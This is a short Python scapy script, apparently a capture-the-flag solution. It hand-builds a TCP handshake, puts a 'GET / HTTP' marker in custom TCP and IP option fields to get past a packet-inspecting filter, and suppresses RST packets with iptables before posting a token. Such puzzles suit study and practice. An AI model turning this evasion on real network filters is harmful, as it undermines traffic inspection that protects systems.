#!/bin/python
# this should be run in kali
from scapy.all import *
#from pwn import *

import random

token = '<mytoken>'

# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

# REMOTE_IP = "202.38.93.111"
# LOCAL_IP = "192.168.52.3"

REMOTE_IP = "192.168.23.1"
LOCAL_IP = "192.168.24.4"

REMOTE_PORT = 18082
LOCAL_PORT = 21001 + random.randint(0, 5000)

needle = 'GET / HTTP'

load_layer('http')


raw_ip_pak = IP(dst=REMOTE_IP, src=LOCAL_IP) 
ip_pak = IP(dst=REMOTE_IP, src=LOCAL_IP, ihl=8, options=('\x00'+needle).ljust(12,'\x00'))
#ip_pak = IP(dst=REMOTE_IP, src=LOCAL_IP)



syn = raw_ip_pak / TCP(dport=REMOTE_PORT, sport=LOCAL_PORT, flags='S', options=[(47, 'GET / HTTP')])
syn_ack = sr1(syn)
print(syn_ack)


HTTP_msg = f'POST / HTTP/1.1\r\nHost: 123\r\nContent-Length: {len(token)}\r\n\r\n{token}\r\n\r\n'
req = raw_ip_pak / \
        TCP(dport=REMOTE_PORT, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, \
        ack=syn_ack[TCP].seq+1, flags="A", options=[(47, 'GET / HTTP')]) / HTTP_msg
#req.show()
#print(bytes(req))

resp = sr1(req)
print(bytes(resp))
#print(resp.summary())
